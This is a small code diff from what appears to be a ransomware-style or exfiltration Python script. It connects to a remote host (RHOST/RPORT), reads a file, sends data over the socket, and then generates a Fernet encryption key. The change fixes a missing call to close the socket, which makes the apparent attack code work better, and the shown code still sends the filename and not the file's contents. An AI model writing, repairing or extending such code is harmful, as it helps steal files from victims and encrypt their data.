@@ -29,7 +29,7 @@ s.connect((RHOST, RPORT))
 with open(file, "rb") as thefile:
     thefile = thefile.read()
     s.send(filename)
-    s.close
+    s.close()
 
 # Generate the key
 key = Fernet.generate_key()
